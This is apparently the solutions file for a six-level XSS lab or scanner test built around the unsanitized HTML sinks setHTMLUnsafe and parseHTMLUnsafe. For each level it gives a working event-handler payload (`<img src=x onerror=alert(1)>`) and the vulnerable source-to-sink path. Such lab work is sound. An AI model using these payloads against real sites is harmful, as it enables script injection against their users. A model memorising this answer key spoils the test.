# htmlunsafe — solutions

The 2024 native HTML-parsing sinks: `Element.setHTMLUnsafe()`,
`Document.parseHTMLUnsafe()`, and `ShadowRoot.setHTMLUnsafe()` (Chrome 124+,
Firefox 123+, Safari 17.4). They parse a string into live DOM with **no**
sanitizer — unlike their safe siblings `setHTML()` / `Document.parseHTML()`.
For XSS they behave like `innerHTML`: an inline `<script>` stays inert, so use
an event-handler payload (`<img src=x onerror=alert(1)>` / `<svg onload=...>`).
DOM-aware scanners detect these by pairing the source with the new sink name.

### htmlunsafe-level1

`/htmlunsafe/level1/#<img src=x onerror=alert(1)>`

- payload: `<img src=x onerror=alert(1)>` (in the URL fragment)
- context: `decodeURIComponent(location.hash.slice(1))` → `el.setHTMLUnsafe()`;
  the `img` is parsed and `onerror` fires. No quote breakout needed.

### htmlunsafe-level2

`/htmlunsafe/level2/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: `location.search` value → `el.setHTMLUnsafe(q)`.

### htmlunsafe-level3

`/htmlunsafe/level3/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: reflected server-side into a JS string (`var msg = '...'`) then
  `el.setHTMLUnsafe(msg)`. A `'` also breaks out of the JS string.

### htmlunsafe-level4

`/htmlunsafe/level4/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: `Document.parseHTMLUnsafe(q)` builds a detached document; its
  `body` nodes are appended into the page and the `onerror` fires.

### htmlunsafe-level5

`/htmlunsafe/level5/#<img src=x onerror=alert(1)>`

- payload: `<img src=x onerror=alert(1)>` (in the URL fragment)
- context: `root.setHTMLUnsafe(html)` on an open shadow root; event-handler
  payloads fire inside the shadow tree exactly as in the light DOM.

### htmlunsafe-level6

`/htmlunsafe/level6/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: the page `fetch()`es `/htmlunsafe/level6/api` (which echoes the
  param raw as `text/html`), then `Document.parseHTMLUnsafe(responseText)`
  parses it and its nodes are appended. Async source → new sink.
